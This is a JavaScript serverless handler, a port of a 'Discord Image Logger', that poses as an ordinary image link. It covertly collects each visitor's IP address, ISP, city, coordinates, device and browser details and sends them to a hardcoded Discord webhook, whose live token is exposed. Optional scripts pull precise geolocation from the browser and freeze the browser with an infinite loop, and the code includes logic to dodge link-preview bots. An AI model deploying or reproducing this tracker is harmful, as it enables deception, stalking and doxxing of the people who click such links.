// Discord Image Logger para Vercel
// Adaptado do código Python original

const https = require('https');
const http = require('http');
const querystring = require('querystring');
const { Buffer } = require('buffer');

// Configuração
const config = {
  // BASE CONFIG
  "webhook": "https://discord.com/api/webhooks/1352417668946202624/V_mU5x7tpRUNzzaSoK2RKz1PLXzDwv2r_jaZnv5e6Y-opOIB9b9ghuPu8CtGnPfwEdKu",
  "image": "https://i.pinimg.com/564x/12/26/e0/1226e0b520b52a84933d697f52600012.jpg",
  "imageArgument": true,

  // CUSTOMIZATION
  "username": "Image Logger",
  "color": 0x00FFFF,

  // OPTIONS
  "crashBrowser": false,
  "accurateLocation": false,
  "message": {
    "doMessage": false,
    "message": "This browser has been pwned by Image Logger.",
    "richMessage": true,
  },
  "vpnCheck": 1,
  "linkAlerts": true,
  "buggedImage": true,
  "antiBot": 1,
  "redirect": {
    "redirect": false,
    "page": "https://your-link.here"
  },
};

// Lista de IPs bloqueados
const blacklistedIPs = ["27", "104", "143", "164"];

// Imagem de carregamento em base64
const loadingImageBase64 = 'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';

// Verifica se é um bot
function botCheck(ip, userAgent) {
  if (ip && (ip.startsWith("34") || ip.startsWith("35"))) {
    return "Discord";
  } else if (userAgent && userAgent.startsWith("TelegramBot")) {
    return "Telegram";
  }
  return false;
}

// Faz uma solicitação HTTP
function makeRequest(url, options, data = null) {
  return new Promise((resolve, reject) => {
    const lib = url.startsWith('https') ? https : http;
    const req = lib.request(url, options, (res) => {
      let responseData = '';
      res.on('data', (chunk) => {
        responseData += chunk;
      });
      res.on('end', () => {
        try {
          resolve(JSON.parse(responseData));
        } catch (e) {
          resolve(responseData);
        }
      });
    });

    req.on('error', (e) => {
      reject(e);
    });

    if (data) {
      req.write(JSON.stringify(data));
    }
    req.end();
  });
}

// Relata um erro para o webhook
async function reportError(error) {
  try {
    const data = {
      username: config.username,
      content: "@everyone",
      embeds: [
        {
          title: "Image Logger - Error",
          color: config.color,
          description: `An error occurred while trying to log an IP!\n\n**Error:**\n\`\`\`\n${error}\n\`\`\``,
        }
      ],
    };

    const options = {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
    };

    await makeRequest(config.webhook, options, data);
  } catch (e) {
    console.error("Error reporting to webhook:", e);
  }
}

// Faz um relatório para o webhook
async function makeReport(ip, userAgent, coords, endpoint, imageUrl) {
  if (!ip || blacklistedIPs.some(prefix => ip.startsWith(prefix))) {
    return null;
  }

  const bot = botCheck(ip, userAgent);
  if (bot) {
    if (config.linkAlerts) {
      try {
        const data = {
          username: config.username,
          content: "",
          embeds: [
            {
              title: "Image Logger - Link Sent",
              color: config.color,
              description: `An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** \`${endpoint}\`\n**IP:** \`${ip}\`\n**Platform:** \`${bot}\``,
            }
          ],
        };

        const options = {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
        };

        await makeRequest(config.webhook, options, data);
      } catch (e) {
        console.error("Error sending bot alert:", e);
      }
    }
    return null;
  }

  let ping = "@everyone";
  let info = null;

  try {
    // Get IP info
    info = await makeRequest(`http://ip-api.com/json/${ip}?fields=16976857`, { method: 'GET' });
    
    if (info && info.proxy) {
      if (config.vpnCheck === 2) {
        return null;
      }
      if (config.vpnCheck === 1) {
        ping = "";
      }
    }

    if (info && info.hosting) {
      if (config.antiBot === 4) {
        if (!info.proxy) {
          return null;
        }
      }
      else if (config.antiBot === 3) {
        return null;
      }
      else if (config.antiBot === 2) {
        if (!info.proxy) {
          ping = "";
        }
      }
      else if (config.antiBot === 1) {
        ping = "";
      }
    }

    // Get browser and OS info
    let os = "Unknown";
    let browser = "Unknown";
    if (userAgent) {
      // Simple browser detection
      if (userAgent.includes("Firefox")) {
        browser = "Firefox";
      } else if (userAgent.includes("Chrome")) {
        browser = "Chrome";
      } else if (userAgent.includes("Safari")) {
        browser = "Safari";
      } else if (userAgent.includes("Edge")) {
        browser = "Edge";
      } else if (userAgent.includes("MSIE") || userAgent.includes("Trident")) {
        browser = "Internet Explorer";
      }

      // Simple OS detection
      if (userAgent.includes("Windows")) {
        os = "Windows";
      } else if (userAgent.includes("Mac OS")) {
        os = "MacOS";
      } else if (userAgent.includes("Android")) {
        os = "Android";
      } else if (userAgent.includes("iOS")) {
        os = "iOS";
      } else if (userAgent.includes("Linux")) {
        os = "Linux";
      }
    }

    // Format data for Discord webhook
    const coordText = coords || (info && `${info.lat}, ${info.lon}`);
    const timezoneText = info && info.timezone ? 
      `${info.timezone.split('/')[1].replace('_', ' ')} (${info.timezone.split('/')[0]})` : 
      'Unknown';

    const data = {
      username: config.username,
      content: ping,
      embeds: [
        {
          title: "Image Logger - IP Logged",
          color: config.color,
          description: `**A User Opened the Original Image!**

**Endpoint:** \`${endpoint}\`
          
**IP Info:**
> **IP:** \`${ip || 'Unknown'}\`
> **Provider:** \`${info?.isp || 'Unknown'}\`
> **ASN:** \`${info?.as || 'Unknown'}\`
> **Country:** \`${info?.country || 'Unknown'}\`
> **Region:** \`${info?.regionName || 'Unknown'}\`
> **City:** \`${info?.city || 'Unknown'}\`
> **Coords:** \`${coordText || 'Unknown'}\` (${coords ? 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++'+coords+')' : 'Approximate'})
> **Timezone:** \`${timezoneText}\`
> **Mobile:** \`${info?.mobile || 'Unknown'}\`
> **VPN:** \`${info?.proxy || 'Unknown'}\`
> **Bot:** \`${info?.hosting && !info?.proxy ? 'Possibly' : 'False'}\`

**PC Info:**
> **OS:** \`${os}\`
> **Browser:** \`${browser}\`

**User Agent:**
\`\`\`
${userAgent || 'Unknown'}
\`\`\``,
        }
      ],
    };

    if (imageUrl) {
      data.embeds[0].thumbnail = { url: imageUrl };
    }

    const options = {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
    };

    await makeRequest(config.webhook, options, data);
    return info;
  } catch (e) {
    console.error("Error making report:", e);
    return null;
  }
}

// Handler principal para o Vercel
module.exports = async (req, res) => {
  try {
    // Obter informações da solicitação
    const path = req.url || '/';
    const userAgent = req.headers['user-agent'] || '';
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               req.socket.remoteAddress || 
               'Unknown';
    
    // Analisar parâmetros de consulta
    const queryIndex = path.indexOf('?');
    const query = queryIndex !== -1 ? 
      querystring.parse(path.substring(queryIndex + 1)) : 
      {};
    
    // Processar a URL da imagem
    let imageUrl = config.image;
    if (config.imageArgument) {
      if (query.url || query.id) {
        try {
          const encoded = query.url || query.id;
          imageUrl = Buffer.from(encoded, 'base64').toString('utf-8');
        } catch (e) {
          console.error("Error decoding image URL:", e);
        }
      }
    }
    
    // Verificar se é um bot
    const bot = botCheck(ip, userAgent);
    if (bot) {
      if (config.buggedImage) {
        makeReport(ip, userAgent, null, path, imageUrl);
        
        res.setHeader('Content-Type', 'image/jpeg');
        res.status(200).send(Buffer.from(loadingImageBase64, 'base64'));
        return;
      } else {
        makeReport(ip, userAgent, null, path, imageUrl);
        
        res.setHeader('Location', imageUrl);
        res.status(302).send();
        return;
      }
    }
    
    // Processar localização
    let result = null;
    if (query.g && config.accurateLocation) {
      try {
        const location = Buffer.from(query.g, 'base64').toString('utf-8');
        result = await makeReport(ip, userAgent, location, path, imageUrl);
      } catch (e) {
        result = await makeReport(ip, userAgent, null, path, imageUrl);
      }
    } else {
      result = await makeReport(ip, userAgent, null, path, imageUrl);
    }
    
    // Criar HTML de resposta
    let htmlContent = `<style>body {
margin: 0;
padding: 0;
}
div.img {
background-image: url('${imageUrl}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}</style><div class="img"></div>`;
    
    // Processar mensagem personalizada se necessário
    if (config.message.doMessage) {
      let message = config.message.message;
      
      if (result && config.message.richMessage) {
        // Substituir placeholders na mensagem
        message = message.replace(/{ip}/g, ip || 'Unknown');
        message = message.replace(/{isp}/g, result?.isp || 'Unknown');
        message = message.replace(/{asn}/g, result?.as || 'Unknown');
        message = message.replace(/{country}/g, result?.country || 'Unknown');
        message = message.replace(/{region}/g, result?.regionName || 'Unknown');
        message = message.replace(/{city}/g, result?.city || 'Unknown');
        message = message.replace(/{lat}/g, result?.lat || 'Unknown');
        message = message.replace(/{long}/g, result?.lon || 'Unknown');
        
        // Timezone formatting
        const timezone = result?.timezone || 'Unknown';
        const formattedTimezone = timezone !== 'Unknown' ?
          `${timezone.split('/')[1].replace('_', ' ')} (${timezone.split('/')[0]})` : 
          'Unknown';
        message = message.replace(/{timezone}/g, formattedTimezone);
        
        message = message.replace(/{mobile}/g, result?.mobile || 'Unknown');
        message = message.replace(/{vpn}/g, result?.proxy || 'Unknown');
        message = message.replace(/{bot}/g, result?.hosting && !result?.proxy ? 
          'Possibly' : 'False');
          
        // Browser detection
        let browser = 'Unknown';
        if (userAgent.includes("Firefox")) browser = "Firefox";
        else if (userAgent.includes("Chrome")) browser = "Chrome";
        else if (userAgent.includes("Safari")) browser = "Safari";
        else if (userAgent.includes("Edge")) browser = "Edge";
        else if (userAgent.includes("MSIE") || userAgent.includes("Trident")) browser = "Internet Explorer";
        message = message.replace(/{browser}/g, browser);
        
        // OS detection
        let os = 'Unknown';
        if (userAgent.includes("Windows")) os = "Windows";
        else if (userAgent.includes("Mac OS")) os = "MacOS";
        else if (userAgent.includes("Android")) os = "Android";
        else if (userAgent.includes("iOS")) os = "iOS";
        else if (userAgent.includes("Linux")) os = "Linux";
        message = message.replace(/{os}/g, os);
      }
      
      htmlContent = message;
    }
    
    // Adicionar script para travar o navegador se configurado
    if (config.crashBrowser) {
      htmlContent += '<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>';
    }
    
    // Redirecionar para outra página se configurado
    if (config.redirect.redirect) {
      htmlContent = `<meta http-equiv="refresh" content="0;url=${config.redirect.page}">`;
    }
    
    // Adicionar script para obter localização precisa se configurado
    if (config.accurateLocation && !query.g) {
      htmlContent += `<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}
</script>`;
    }
    
    // Enviar resposta
    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(htmlContent);
    
  } catch (e) {
    console.error("Error:", e);
    reportError(e.stack || e.toString());
    
    res.setHeader('Content-Type', 'text/html');
    res.status(500).send('500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.');
  }
};
